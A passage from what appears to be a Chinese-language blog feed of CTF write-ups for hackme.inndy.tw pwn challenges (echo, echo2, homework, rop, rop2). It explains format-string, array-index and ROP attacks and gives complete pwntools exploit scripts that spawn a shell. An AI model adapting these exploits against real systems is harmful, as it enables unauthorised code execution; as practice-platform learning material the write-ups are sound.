elf.symbols['read']log.info("*********migrate stack***********")payload = '\x00'*offset + p32(0x804865C) + p32(pop_ebp) + p32(bss+0x400) + p32(leave_ret)p.send(payload)payload1 = 'a'*4 +p32(read_plt) + p32(pop3_ret) + p32(0) + p32(base_stage) + p32(100) payload1 += rop.dl_resolve_call(base_stage+20,base_stage)payload1 += rop.fill(0x7f,payload1) p.sendline(payload1)buf = '/bin/sh\x00'buf += rop.fill(20,buf)buf += rop.dl_resolve_data(base_stage + 20,'system')buf += rop.fill(100,buf)p.send(buf)p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[echo 和 echo2 writeup]]></title>
    <url>%2F2018%2F05%2F10%2F2018-5-10-echo-%E5%92%8C-echo2-writeup%2F</url>
    <content type="text"><![CDATA[hackme.inndy 的echo 和 echo2 echo防护机制： 32位的开启了NX的程序ida反编译一下： 很明显的一个格式化字符串漏洞，加上程序中存在system函数，所以可以将printf_got覆盖成system函数，再传入”/bin/sh” 来getshell这里我用了pwntools库中的fmtstr_payload()函数 exp:12345678910111213141516from pwn import*context.log_level= &quot;debug&quot;p = remote(&apos;hackme.inndy.tw&apos;,7711) #p = process(&apos;./echo&apos;)elf = ELF(&apos;./echo&apos;)system = elf.symbols[&apos;system&apos;]printf_got = elf.got[&apos;printf&apos;]bss = elf.bss()offset = 7payload = fmtstr_payload(offset,&#123;printf_got : system&#125;) # change the got of printf to systemp.send(payload)p.send(&quot;/bin/sh\x00&quot;)p.interactive() 结果： echo2防护机制： 发现程序开启了PIEPIE：是位置无关的可执行程序，用于生成位置无关的可执行程序，所谓位置无关的可执行程序，指的是，可执行程序的代码指令集可以被加载到任意位置，进程通过相对地址获取指令操作和数据，如果不是位置无关的可执行程序，则该可执行程序的代码指令集必须放到特定的位置才可运行进程。但是低两位字节是固定的，可以通过这个泄露出程序基地址 ida反编译： 发现这题的关键代码和前面那道题很相似，同样是一个格式化字符串漏洞，同样含有system函数，但是这一题是64位的并且开启了PIE的程序，所以需要先泄露出程序的基地址 gdb调试一番： 格式化字符串位于栈上，并且相对偏移为7查看栈上的内容： 程序的栈上有printf函数的返回地址和一些其他函数的返回地址所以可以通过泄露出printf函数的返回地址来计算出程序的基地址1program_base = leakmemory - offset 泄露libc_start_main+240的地址来算出libc的基地址通过在发送payload的语句后加一条gdb.attach(p)语句，进入调试界面，输入vmmap命令，计算出libc_base 和 libc_start_main+240的偏移，那就可以通过泄露出来的地址得到libc_base的地址了，因为不管PIE它的地址怎么变，lib_start_main的地址到libc_base的偏移是不会变的，同时可以得到libc_start_main在libc中的偏移，通过这个偏移可以查到程序的libc的版本libsearch 123libc_base = __libc_start_main +240 - offsetoffset = __libc_start_main +240 - 0x7ffff7a0d000libc_start_main_offset = offset - 240 查到libc的版本 有这么多 ，一般要再泄露多一个地址，比较精准，不过一个个试也可以，这里服务器用的libc版本是 9 获取了lib版本后就可以开始下一步了，我没有用system函数，我用one_gadget这个工具找到了execve(“/bin/sh”,null,environ)的偏移，然后将exit_got覆盖成了one_gadget的地址，因为exit也是libc库中的函数，所以只要覆盖低五位就可以了，我用”%hn”来改写地址的内容，一次修改两个字节，改写完后输入”exit”，就可以getshell 64位需要注意的是： 它的函数地址存在’\x00’截断，所以要将函数地址放到最后 控制好函数地址的相对偏移 exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/env python# coding=utf-8from pwn import*context.log_level = &quot;debug&quot;p = remote(&quot;hackme.inndy.tw&quot;,7712)#p = process(&apos;./echo2&apos;)elf = ELF(&apos;./echo2&apos;)exit_got = elf.got[&apos;exit&apos;]def memleak(offset): payload = &apos;%&apos; + str(offset) + &quot;$p&quot; p.sendline(payload) data = p.recv()[0:-1] print data data = int(data,16) return datalog.info(&quot;************leak program base address************&quot;)_libc_csu_init = memleak(41)p_add = _libc_csu_init - 0xa03print &quot;base address --&gt;[%s]&quot;%hex(p_add)_libc_start_main_add = memleak(43) - 240print &quot;_libc_start_main_add --&gt;[%s]&quot;%hex(_libc_start_main_add)_libc_start_main_offset = 0x20740print &quot;_libc_start_main_offset --&gt; [%s] &quot;%hex(_libc_start_main_offset)libc_base = _libc_start_main_add - _libc_start_main_offsetprint &quot;libc_base --&gt; [%s]&quot;%hex(libc_base) one_gadget = 0xf0897#execve(&quot;/bin/sh&quot;,null,environ)#one_gadget = 0xf02a4print &quot;one_gadget --&gt; [%s]&quot;%hex(one_gadget)one_gadget_add = libc_base + one_gadgetprint &quot;on_gadget_add --&gt; [%s]&quot;%hex(one_gadget_add)log.info(&quot;*********write execve address to exit_got*******&quot;)exit_got = p_add + exit_gotprint &quot;exit_got --&gt; [%s]&quot;%hex(exit_got)hex_one_gadget = hex(one_gadget_add)add1 = str(int(int(hex_one_gadget[-4:],16))-19)add2 = str(int(int(hex_one_gadget[-8:-4],16))-19)add3 = str(int(int(hex_one_gadget[-12:-8],16))-19)payload1 = &quot;aaaaaaaaaaaaaaaaaaa%&quot; + add1 + &quot;c&quot; + &quot;%10$hn&quot; + p64(exit_got)payload2 = &quot;aaaaaaaaaaaaaaaaaaa%&quot; + add2 + &quot;c&quot; + &quot;%10$hn&quot; + p64(exit_got+2)payload3 = &quot;aaaaaaaaaaaaaaaaaaa%&quot; + add3 + &quot;c&quot; + &quot;%10$hn&quot; + p64(exit_got+4)p.sendline(payload1)p.sendline(payload2)p.sendline(payload3)p.send(&quot;exit\n&quot;)p.interactive() 结果： 写echo2的时候参考了大佬的writeup]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[homework writeup]]></title>
    <url>%2F2018%2F05%2F09%2F2018-5-9-homework-writeup%2F</url>
    <content type="text"><![CDATA[题目：homework (hackme.inndy.tw)hint: Index out bound ,return address ,并且给了程序源码题目防护机制： 开启了NX和Canary源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; char name[1024]; void call_me_maybe() &#123; system("/bin/sh"); &#125; void unbuffer_io() &#123; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); &#125; void set_timeout() &#123; alarm(120); &#125; void ask_name() &#123; printf("What's your name? "); gets(name); &#125; void say_goodbye() &#123; printf("Goodbye, %s\n", name); &#125; void run_program() &#123; int arr[10], i, v, act; for(i = 0; i &lt; 10; i++) arr[i] = 0; while(1) &#123; puts("0 &gt; exit"); puts("1 &gt; edit number"); puts("2 &gt; show number"); puts("3 &gt; sum"); puts("4 &gt; dump all numbers"); printf(" &gt; "); scanf("%d", &amp;act); switch(act) &#123; case 0: return; case 1: printf("Index to edit: "); scanf("%d", &amp;i); printf("How many? "); scanf("%d", &amp;v); arr[i] = v; break; case 2: printf("Index to show: "); scanf("%d", &amp;i); printf("arr[%d] is %d\n", i, arr[i]); break; case 3: v = 0; for(i = 0; i &lt; 10; i++) v += arr[i]; printf("Sum is %d\n", v); break; case 4: for(i = 0; i &lt; 10; i++) printf("arr[%d] is %d\n", i, arr[i]); break; &#125; &#125; &#125; int main() &#123; set_timeout(); unbuffer_io(); ask_name(); run_program(); say_goodbye(); return 0; &#125; 通过阅读它的源码可以发现它对数组的下标没有很好的限制，我们可以通过输入一个数组下标和值来改表数组的值，如果输入的数组下标超出了程序数组的大小，就可以改写内存中的值。同时，它程序中存在system函数，结合题目的hint可以推断出这是一个数组下标溢出题，通过下标溢出，将返回地址覆盖成system函数来获取shell 数组下标溢出原理：因为c语言不会检测数组下标，所以如果我们给数组一个超出它大小的下标，就会照成数组越界。如果是想数组中写入数据的话，就会造成数据写入到不属于数组的地方，或者说如果读取数据的话，就会读取到别的地方的数据。因为数组地址是自低往高增长，而栈的地址是自高向下降低，所以如果我们将数组下标根据栈内的空间的分布，设置为特定的值，就可以修改或者是查看我们想要查看的地址的值。比如将返回地址设置成我们想要调用函数的地址。 具体可以参考这篇博客 所以只要找到返回地址对应着数组的位置是什么，再通过edit功能将返回地址修改为system函数的地址来获取shell 数组在栈中的位置是0x34,和返回地址的距离是0x34+8所以输入的数组下标为14 exp:123456789101112131415161718from pwn import* context.log_level="debug" #p = process('./homework') p = remote('hackme.inndy.tw', 7701) p.recvuntil("What's your name?") p.sendline('aaaa') p.recvuntil(" &gt; ") p.sendline("1") p.recv() p.sendline("14") p.recvuntil("How many?") p.sendline(str(0x080485fb)) p.recv()p.sendline("0")#make program return to target function p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rop 和 rop2 writeup]]></title>
    <url>%2F2018%2F05%2F09%2F2018-5-9-rop-%E5%92%8C-rop2-writeup%2F</url>
    <content type="text"><![CDATA[题目来源：国外的一个ctf平台hackme rophint: ROP buffer overflow防护机制： 拖到IDA反编译一下 可以看到有很多函数 ，不管是用到的还是没用的都有，说明它编译时用的是静态连接我们可以通过ROPgadget 来直接构造ropchain命令为 ROPgadget –binary rop –ropchain 栈的大小可以通过peda的pattern search 来找到先生成 长度为100的字符串 pattern create 100然后执行程序 栈的大小为12exp:123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import * from struct import pack sh = remote('hackme.inndy.tw',7704) junk = 'a'*12 + "BBBB" # junk + ebp p = junk p += pack('&lt;I', 0x0806ecda) # pop edx ; ret p += pack('&lt;I', 0x080ea060) # @ .data p += pack('&lt;I', 0x080b8016) # pop eax ; ret p += '/bin' p += pack('&lt;I', 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack('&lt;I', 0x0806ecda) # pop edx ; ret p += pack('&lt;I', 0x080ea064) # @ .data + 4 p += pack('&lt;I', 0x080b8016) # pop eax ; ret p += '//sh' p += pack('&lt;I', 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack('&lt;I', 0x0806ecda) # pop edx ; ret p += pack('&lt;I', 0x080ea068) # @ .data + 8 p += pack('&lt;I', 0x080492d3) # xor eax, eax ; ret p += pack('&lt;I', 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack('&lt;I', 0x080481c9) # pop ebx ; ret p += pack('&lt;I', 0x080ea060) # @ .data p += pack('&lt;I', 0x080de769) # pop ecx ; ret p += pack('&lt;I', 0x080ea068) # @ .data + 8 p += pack('&lt;I', 0x0806ecda) # pop edx ; ret p += pack('&lt;I', 0x080ea068) # @ .data + 8 p += pack('&lt;I', 0x080492d3) # xor eax, eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0807a66f) # inc eax ; ret p += pack('&lt;I', 0x0806c943) # int 0x80 sh.sendline(p) sh.interactive() rop2hint：ROPgadget not working anymore说明不可以再通过ROPgadget来获取ropchain了检查下防护机制 只开启了NX 简单运行了一下程序： 程序要求你输入一串字符串 然后打印出了一堆东西 将程序拖到ida中，来一手f5大法 发现了syscall函数 ，查了一下发现程序中的syscall(4,1,&amp;v4,42) 和syscall(3,0,&amp;v1,1024) 分别调用了write()函数和read函数的系统调用 解题思路：将syscall中的第一个参数设置为execve()函数的调用号，第二个 参数设置为“/bin/sh”参数的地址 来执行execve()获取shell execve()函数的系统调用号 为0xb exp:123456789101112131415161718from pwn import* p = remote('hackme.inndy.tw',7703) elf = ELF('./rop2') bss = elf.bss() syscall = elf.symbols['syscall'] overflow = elf.symbols['overflow'] p.recv() payload = 'a'*0xC + 'bbbb' + p32(syscall) + p32(overflow) # junk + target_address + return_address payload += p32(3) + p32(0) + p32(bss) + p32(8) #syscall(3,0,bss_add,8) p.send(payload) p.send("/bin/sh\x00") payload1 = 'a'*0xc + "BBBB" + p32(syscall) payload1 += p32(overflow)+ p32(0xb) + p32(bss) + p32(0) + p32(0) #syscall(0xb,bss_add,0,0) = execve("bin/sh",0,0) p.send(payload1) p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
